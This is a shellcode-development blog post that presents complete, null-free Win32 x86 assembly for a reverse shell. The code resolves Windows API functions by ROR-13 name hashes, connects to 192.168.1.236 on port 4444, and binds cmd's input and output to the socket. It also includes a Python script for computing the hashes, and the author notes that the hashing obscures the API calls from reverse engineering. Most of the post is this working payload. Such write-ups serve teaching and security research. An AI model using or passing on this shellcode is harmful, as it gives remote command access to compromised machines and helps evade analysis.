---
layout: single
title: Win32 Shellcode - Hashed Reverse Shell
date: 2019-11-30
classes: wide
header:
  teaser: /assets/images/shell.png
tags:
  - Assembly
  - Pentester
  - Windows
  - Shellcode
  - x86
  - Reverse shell
--- 
![](/assets/images/shell.png)<br>

## Introduction
In the last post we wrote a reverse shell using ```LoadLibraryA``` and ```GetProcAddress``` to find a word defined function address in memory. This example is a straight forward process to obtain a shellcode for our porposes but the algorithm just discussed has a weakness: It performs a strcmp against each export name until it finds the correct one. This requires that the full name of each API function the shellcode uses be included as an ASCII string. When the size of the shellcode is constrained, these strings could push the size of the shellcode over the limit.<br>
A common way to address this problem is to calculate a hash of each symbol string and compare the result with a precomputed value stored in the shellcode. The hash function does not need to be sophisticated; it only needs to guarantee that within each DLL used by the shellcode, the hashes that the shellcode uses are unique. Hash collisions between symbols in different DLLs and between symbols the shellcode does not use are fine. The most common hash function is the 32-bit rotate-right-additive hash.<br>
In this post we'll using hashed name to find functions. 

```assembly
hashString:
    push esi
    push edi
    mov esi, dword [esp+0x0c]   ; load function argument in esi
calc_hash:
    xor edi, edi
    cld
hash_iter:
    xor eax, eax
    lodsb                       ; load next byte of input string
    cmp al, ah
    je  hash_done               ; check if at end of symbol
    ror edi, 0x0d               ; rotate right 13 (0x0d)
    add edi, eax
    jmp hash_iter
hash_done:
    mov eax, edi
    pop edi
    pop esi
    ret                         ; use ret against retn 8 that produce NULL bytes
```
This function calculates a 32-bit DWORD hash value of the string pointer argument. The EDI register is treated as the current hash value, and is initialized to zero. Each byte of the input string is loaded via the lodsb instruction at ```lodsb```. If the byte is not NULL, the current hash is rotated right by 13 ```0x0d``` in hex, and the current byte is added into the hash. This hash is returned in EAX so that its caller can compare the result with the value compiled into the code.<br>
This PE parsing ability instead of ```GetProcAddress``` approach has the additional benefit of making reverse-engineering of the shellcode more difficult. The hash values hide the API calls used from casual inspection. 

```assembly
findSymbolByHash:
    pushad
    mov ebp, [esp + 0x24]       ; load 1st arg: dllBase
    mov eax, [ebp + 0x3c]       ; get offset to PE signature
    ; load edx w/ DataDirectories array: assumes PE32
    mov edx, [ebp + eax + 4+20+96]
    add edx, ebp                ; edx:= addr IMAGE_EXPORT_DIRECTORY
    mov ecx, [edx + 0x18]       ; ecx:= NumberOfNames
    mov ebx, [edx + 0x20]       ; ebx:= RVA of AddressOfNames
    add ebx, ebp                ; rva->va
search_loop:
    dec ecx                     ; dec loop counter

    ; esi:= next name, uses ecx*4 because each pointer is 4 bytes
    mov esi, [ebx+ecx*4]
    add esi, ebp                ; rva->va
    push esi
    call edi                    ; call hashString to obtain the current string
    add sp, 4                   ; avoid NULL bytes 

    ; check hash result against arg #2 on stack: symHash
    cmp eax, [esp + 0x28]
    jnz search_loop

    ; at this point we found the string in AddressOfNames
    mov ebx, [edx+0x24]         ; ebx:= ordinal table rva
    add ebx, ebp                ; rva->va

    ; turn cx into ordinal from name index.
    ; use ecx*2: each value is 2 bytes

    mov cx, [ebx+ecx*2]
    mov ebx, [edx+0x1c]         ; ebx:= RVA of AddressOfFunctions
    add ebx, ebp                ; rva->va

    ; eax:= Export function rva. Use ecx*4: each value is 4 bytes
    mov eax, [ebx+ecx*4]
    add eax, ebp                ; rva->va
done:
    mov [esp + 0x1c], eax       ; overwrite eax saved on stack
    popad
    ret                         ; use ret against retn 4 that produce NULL bytes
```
The code begins parsing the PE file to get the pointer to the PE signature. A pointer to ```IMAGE_EXPORT_DIRECTORY``` is created by adding the correct offset, assuming this is a 32-bit PE file. The code begins parsing the ```IMAGE_EXPORT_DIRECTORY``` structure, loading the ```NumberOfNames``` value and the ```AddressOfNames``` pointer. Each string pointer in ```AddressOfNames``` is passed to the ```hashString``` function, and the result of this calculation is compared against the value passed as the function argument. Once the correct index into ```AddressOfNames``` is found, it is used as an index into the ```AddressOfNameOrdinals``` array to obtain the corresponding ordinal value, which is used as an index into the ```AddressOfFunctions``` array. This is the value the user wants, so it is written to the stack, overwriting the EAX value saved by the ```pushad``` instruction so that this value is preserved by the following ```popad``` instruction.<br>
To calculate the hash string of ours function we can use a simple script found on [StackExchange](https://reverseengineering.stackexchange.com/questions/17289/how-to-find-a-fuction-hash-when-manually-resolving-in-shellcode)

```python
#!/usr/bin/python
import sys

if len(sys.argv) == 2:

	def rol32(val, amt):
	        return ( (val << amt) & 0xffffffff ) | ( ( val >> (32 - amt) ) & 0xffffffff )

	def ror32(val, amt):
	        return ( (val >> amt) & 0xffffffff ) | ( ( val << (32 - amt) ) & 0xffffffff )

	def add32(val, amt):
	        return (val + amt) & 0xffffffff

	def hash_export(name):
	    result = 0
	    index = 0
	    while(index < len(name)):
	        result  = add32(ror32(result, 13), ord(name[index]) & 0xff)
	        index += 1
	    return result

        def main():
            print hex(hash_export(sys.argv[1]))

if __name__ == '__main__':
	main()
```
The original one makes a right rotation but we can also use a left rotation or can use shift instead of rotation. It's manadatory that all changes made on the script must be done also in the ASM shellcode. 

![](/assets/images/windows/x86/reverse_shell_hash_1.png)<br>

## The shellcode
First thing we choosed to load the ```hashString``` and ```findSymbolByHash``` addresses respectively in ```EBP``` and ```EDI``` registers to avoid NULL bytes produced by calling directly this function during the process, secondly by using the PE parsing, we choosed to find and store all the necessary functions addresses at the begin of our shellcode and use ```ESI``` register like a base offset for our saved addresses.<br>
Last thing, we used a lot of code of previous shellcode, probably some pieces could be optimized.<br>
The shellcode works on both x86 Win 7 and Win 10 but assuming the fact:
>The particular algorithm has become commonly used due to its inclusion in [Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm), but variations that use different rotation amounts and hash sizes are sometimes seen.<br>

You must note that this could makes our shellcode marked as malicious by Windows Defender AV and others AV and IDS/IPS/ATP agents :)
You could read an interesting article on [Fireeye](https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html) blog, about this argument.

```assembly
global _start

section .text
_start:

 ; this avoid the NULL bytes producted by calling functions directly
 mov ebp, findSymbolByHash
 mov edi, hashString

getKernel32Base:
    xor ecx, ecx                ; zeroing register ECX
    mul ecx                     ; zeroing register EAX EDX
    mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
    mov eax, [eax + 0x00c]      ; LDR loaded in eax
    mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
    lodsd                       ; program.exe address loaded in eax (1st module)
    xchg esi, eax               
    lodsd                       ; ntdll.dll address loaded (2nd module)
    mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)
    mov eax, ebx
    
    ; EAX 76140000 kernel32.76140000
    ; ECX 00000000
    ; EDX 00000000
    ; EBX 76140000 kernel32.76140000
    ; ESP 0022FF8C
    ; EBP 0022FF94
    ; ESI 0054190C
    ; EDI 00000000
    ; EIP 00401005 reverse_.00401005

    push 0xec0e4e8e          ; LoadLibraryA hash
    push eax
    call ebp                 ; call findSymbolByHash
 
    ; EAX 76192864 kernel32.LoadLibraryA
    ; ECX 00000000
    ; EDX 00000000
    ; EBX 76140000 kernel32.76140000
    ; ESP 0022FF8C
    ; EBP 0022FF94
    ; ESI 0054190C
    ; EDI 00000000
    ; EIP 00401010 reverse_.00401010

    
getws2_32:
    push 0x61613233                 ; 23
    sub word [esp + 0x2], 0x6161    ; sub aa from aa23_2sw
    push 0x5f327377                 ; _2sw
    push esp                        ; pointer to the string
    call eax                        ; call Loadlibrary and find ws2_32.dll
    mov edx, eax                    ; save winsock handle for future puproses

    ; EAX 75FE0000 OFFSET ws2_32.#332
    ; ECX 77BE316F ntdll.77BE316F
    ; EDX 75FE0000 OFFSET ws2_32.#332
    ; EBX 760C0000 kernel32.760C0000
    ; ESP 0022FF84 ASCII "ws2_32"
    ; EBP 004010F7 reverse_.004010F7
    ; ESI 0054190C
    ; EDI 00401140 reverse_.00401140
    ; EIP 00401040 reverse_.00401040

getWSAStartup:
    push 0x3bfcedcb                 ; WSAStartup hash
    push edx                        ; push ws2_32.dll handler
    call ebp                        ; find WSAStartup in ws2_32.dll handler
    add sp, 8
    push eax
    lea esi, [esp]
    mov [esi+0x4], eax

getWSASocketA:
    push 0xadf509d9                 ; WSASocketA hash
    push edx                        ; push ws2_32.dll handler
    call ebp                        ; find WSASocketA in ws2_32.dll handler
    add sp, 8
    mov [esi+0x8], eax

getConnect:
    push 0x60aaf9ec                 ; connect hash
    push edx                        ; push ws2_32.dll handler
    call ebp                        ; find connect in ws2_32.dll handler
    add sp, 8
    mov [esi+0xc], eax

getCreateProcessA:
    push 0x16b3fe72                 ; CreateProcessA hash
    push ebx                        ; push kernel32.dll handler
    call ebp                        ; find CreateProcessA in kernel32.dll handler
    add sp, 8
    mov [esi+0x10], eax

getExitProcess:
    push 0x73e2d87e          ; ExitProcess hash
    push ebx                 ; kernel32 dll location
    call ebp    
    add sp, 8
    mov [esi+0x14], eax         
    
callWSAStartUp:
    xor edx, edx
    mov dx, 0x190          ; EAX = sizeof( struct WSAData )
    sub esp, edx           ; alloc some space for the WSAData structure
    push esp               ; push a pointer to this stuct
    push edx               ; push the wVersionRequested parameter
    call dword [esi+0x4]   ; call WSAStartup(MAKEWORD(2, 2), wsadata_pointer)

callWSASocketA:
    xor edx, edx                    ; clear edx
    push edx;                       ; dwFlags=NULL
    push edx;                       ; g=NULL
    push edx;                       ; lpProtocolInfo=NULL
    mov dl, 0x6                     ; protocol=6
    push edx
    sub dl, 0x5                     ; edx==1
    push edx                        ; type=1
    inc edx                         ; af=2
    push edx
    call dword [esi+0x8]            ; call WSASocketA
    push eax                        ; save eax in edi
    pop edi                         ; 

callConnect:
    ;set up sockaddr_in
    mov edx, 0xed02a9c1             ;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.1.236)
    sub edx, 0x01010101             ;subtract from edx to obtain the real IP
    push edx                        ;push sin_addr
    push word 0x5c11                ;0x115c = (port 4444)
    xor edx, edx
    mov dl, 2
    push dx 
    mov edx, esp
    push byte 0x10
    push edx
    push edi
    call dword [esi+0xc] 

shell:
    push 0x61646d63                 ; push admc
    sub word [esp + 0x3], 0x61      ; sub a to admc = dmc
    mov ebp, esp                    ; save a pointer to the command line
    push edi                        ; our socket becomes the shells hStdError
    push edi                        ; our socket becomes the shells hStdOutput
    push edi                        ; our socket becomes the shells hStdInput
    xor edi, edi                    ; Clear edi for all the NULL's we need to push
    push byte 0x12                  ; We want to place (18 * 4) = 72 null bytes onto the stack
    pop ecx                         ; Set ECX for the loop

push_loop:
    push edi                        ; push a null dword
    loop push_loop                  ; keep looping untill we have pushed enough nulls
    mov word [esp + 0x3C], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    mov byte [esp + 0x10], 0x44
    lea ecx, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

    ;perform the call to CreateProcessA
    push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
    push ecx               ; Push the pointer to the STARTUPINFO Structure
    push edi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
    push edi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
    push edi               ; We dont specify any dwCreationFlags 
    inc edi                ; Increment edi to be one
    push edi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
    dec edi                ; Decrement edi back down to zero
    push edi               ; Set lpThreadAttributes to NULL
    push edi               ; Set lpProcessAttributes to NULL
    push ebp               ; Set the lpCommandLine to point to "cmd",0
    push edi               ; Set lpApplicationName to NULL as we are using the command line param instead
    call dword [esi+0x10]

callExitProcess:
    xor  edx, edx
    push edx                ; uExitCode
    call dword [esi+0x14]   ; call ExitProcess(0)

;----------------------------------------------------------;
; Functions called                                         ;
;----------------------------------------------------------;


findSymbolByHash:
    pushad
    mov ebp, [esp + 0x24]       ; load 1st arg: dllBase
    mov eax, [ebp + 0x3c]       ; get offset to PE signature
    ; load edx w/ DataDirectories array: assumes PE32
    mov edx, [ebp + eax + 4+20+96]
    add edx, ebp                ; edx:= addr IMAGE_EXPORT_DIRECTORY
    mov ecx, [edx + 0x18]       ; ecx:= NumberOfNames
    mov ebx, [edx + 0x20]       ; ebx:= RVA of AddressOfNames
    add ebx, ebp                ; rva->va
search_loop:
    dec ecx                     ; dec loop counter

    ; esi:= next name, uses ecx*4 because each pointer is 4 bytes
    mov esi, [ebx+ecx*4]
    add esi, ebp                ; rva->va
    push esi
    call edi              ; hash the current string
    add sp, 4

    ; check hash result against arg #2 on stack: symHash
    cmp eax, [esp + 0x28]
    jnz search_loop

    ; at this point we found the string in AddressOfNames
    mov ebx, [edx+0x24]         ; ebx:= ordinal table rva
    add ebx, ebp                ; rva->va

    ; turn cx into ordinal from name index.
    ; use ecx*2: each value is 2 bytes

    mov cx, [ebx+ecx*2]
    mov ebx, [edx+0x1c]         ; ebx:= RVA of AddressOfFunctions
    add ebx, ebp                ; rva->va

    ; eax:= Export function rva. Use ecx*4: each value is 4 bytes
    mov eax, [ebx+ecx*4]
    add eax, ebp                ; rva->va
done:
    mov [esp + 0x1c], eax       ; overwrite eax saved on stack
    popad
    ret


hashString:
    push esi
    push edi
    mov esi, dword [esp+0x0c]   ; load function argument in esi
calc_hash:
    xor edi, edi
    cld
hash_iter:
    xor eax, eax
    lodsb                       ; load next byte of input string
    cmp al, ah
    je  hash_done               ; check if at end of symbol
    ror edi, 0x0d               ; rotate right 13 (0x0d)
    add edi, eax
    jmp hash_iter
hash_done:
    mov eax, edi
    pop edi
    pop esi
    ret
```


![](/assets/images/windows/x86/reverse_shell_hash_0.gif)<br>

The shellcode is NULL free.<br>

## References
- [This amazing book](https://nostarch.com/malware) help me a lot understand how Win32 kernel API works
- [The amazing h0mbre blog](https://h0mbre.github.io/Babys-First-Shellcode/) 
- [Introduction to Windows Shellcode Development – Part 3](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/) by [@NytroRST](https://twitter.com/NytroRST/)
- [Windows Shellcoding x86 – Hunting Kernel32.dll – Part 1](https://0xdarkvortex.dev/index.php/2019/03/18/windows-shellcoding-x86-hunting-kernel32-dll-part-1/) by [@NinjaParanoid](https://twitter.com/NinjaParanoid)
- [Shellcoding for Linux and Windows Tutorial](http://www.vividmachines.com/shellcode/shellcode.html#ws) by [Steve Hanna](https://twitter.com/lestevehanna)
- [A good paper book](http://hick.org/code/skape/papers/win32-shellcode.pdf)
- [Windows x86 MessageBox shellcode](https://marcosvalle.github.io/re/exploit/2019/01/19/messagebox-shellcode.html) by [@MValle](https://twitter.com/_mvalle_) 
- [The PacketStorm Calc Shellcode](https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html)
- [My Github Win x86 shellcode repo](https://github.com/bolonobolo/shellcode)